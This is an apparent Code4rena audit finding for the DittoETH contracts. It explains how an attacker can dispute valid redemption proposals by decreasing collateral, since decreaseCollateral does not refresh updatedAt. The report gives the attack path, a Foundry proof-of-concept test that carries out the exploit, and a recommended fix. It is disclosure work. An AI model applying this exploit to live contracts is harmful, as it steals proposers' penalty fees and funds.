[H-07] Valid redemption proposals can be disputed by decreasing collateral
Submitted byCosine, also found byilchovskiandklau5
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L259
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ShortRecordFacet.sol#L81-L104
Impact
When a user creates a redemption proposal with theproposeRedemptionfunction the user has to provide a list of the short records (SRs) with the lowest collateral ratios (CR) in the system ascending.
To prevent users from creating proposals with a wrong SR list, anyone is allowed to dispute proposals with thedisputeRedemptionfunction. This function allows the disputer to prove that a SR with a lower CR was not included in the proposal and for doing so the disputer receives a penalty fee from the proposer. Therefore, if an attacker can dispute a valid redemption proposal, the attacker can steal funds from a proposer.
To avoid malicious disputers the system invented aDISPUTE_REDEMPTION_BUFFERthat should prevent users from disputing with a SR that was created/modified<=1 hour before the redemption proposal was created:
if(disputeCR<incorrectProposal.CR&&disputeSR.updatedAt+C.DISPUTE_REDEMPTION_BUFFER<=redeemerAssetUser.timeProposed)
But not every function that modifies a SR updates theupdatedAtparam. This enables the possibility for an attacker to dispute a valid redemption proposal by modifying a SR after the proposal so that the proposer does not have the chance to create a correct proposal.
ThedecreaseCollateralfunction does not update theupdatedAtparam and therefore, the following attack path is enabled:
initialCRof the given asset is set to 1.7 (as in the docs) and the max redemption CR is 2 (constant).User creates a valid redemption proposal where the SRs have a CR above theinitialCR.The attacker owns a SR with a CR above the ones in the proposal.The attacker decreases the CR of the own SR to theinitialCR, disputes the redemption to receive the penalty fee, and increases the CR back up in one transaction.
Proof of Concept
The following POC can be implemented in theRedemption.t.soltest file:
functiontest_decrease_cr_dispute_attack()public{// add import {O} from "contracts/libraries/DataTypes.sol"; to the imports to run this test// create three SRs with increasing CRs above initialCR// set initial CR to 1.7 as in the docsvm.startPrank(owner);diamond.setInitialCR(asset,170);uint80price=diamond.getOraclePriceT(asset);fundLimitBidOpt(price,DEFAULT_AMOUNT,receiver);depositEth(sender,price.mulU88(DEFAULT_AMOUNT).mulU88(100e18));uint16[]memoryshortHintArray=setShortHintArray();MTypes.OrderHint[]memoryorderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,price,DEFAULT_AMOUNT,orderHintArray,shortHintArray,70);fundLimitBidOpt(price+1,DEFAULT_AMOUNT,receiver);shortHintArray=setShortHintArray();orderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,price,DEFAULT_AMOUNT,orderHintArray,shortHintArray,80);fundLimitBidOpt(price+2,DEFAULT_AMOUNT,receiver);shortHintArray=setShortHintArray();orderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,price,DEFAULT_AMOUNT,orderHintArray,shortHintArray,100);skip(1hours);STypes.ShortRecordmemorysr1=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID);STypes.ShortRecordmemorysr2=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+1);STypes.ShortRecordmemorysr3=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+2);uint256cr1=diamond.getCollateralRatio(asset,sr1);uint256cr2=diamond.getCollateralRatio(asset,sr2);uint256cr3=diamond.getCollateralRatio(asset,sr3);// CRs are increasingassertGt(cr2,cr1);assertGt(cr3,cr2);// user proposes a redemptionuint88_redemptionAmounts=DEFAULT_AMOUNT*2;uint88initialErcEscrowed=DEFAULT_AMOUNT;MTypes.ProposalInput[]memoryproposalInputs=makeProposalInputsForDispute({shortId1:C.SHORT_STARTING_ID,shortId2:C.SHORT_STARTING_ID+1});addressredeemer=receiver;vm.prank(redeemer);diamond.proposeRedemption(asset,proposalInputs,_redemptionAmounts,MAX_REDEMPTION_FEE);// attacker decreases collateral of a SR with a CR above the ones in the proposal so that they fall below the CR of the SRs in the proposaluint32updatedAtBefore=getShortRecord(sender,C.SHORT_STARTING_ID+2).updatedAt;vm.prank(sender);diamond.decreaseCollateral(asset,C.SHORT_STARTING_ID+2,0.3e18);uint32updatedAtAfter=getShortRecord(sender,C.SHORT_STARTING_ID+2).updatedAt;// updatedAt param is not updated when decreasing collateralassertEq(updatedAtBefore,updatedAtAfter);// attacker successfully disputes the redemption proposaladdressdisputer=extra;vm.prank(disputer);diamond.disputeRedemption({asset:asset,redeemer:redeemer,incorrectIndex:1,disputeShorter:sender,disputeShortId:C.SHORT_STARTING_ID+2});}
Recommended Mitigation Steps
Update theupdatedAtparam when decreasing collateral, or do now allow redemption proposals of SRs above theinitialCR(as decreasing below that is not possible).
Assessed type
Context
ditto-eth (DittoETH) confirmed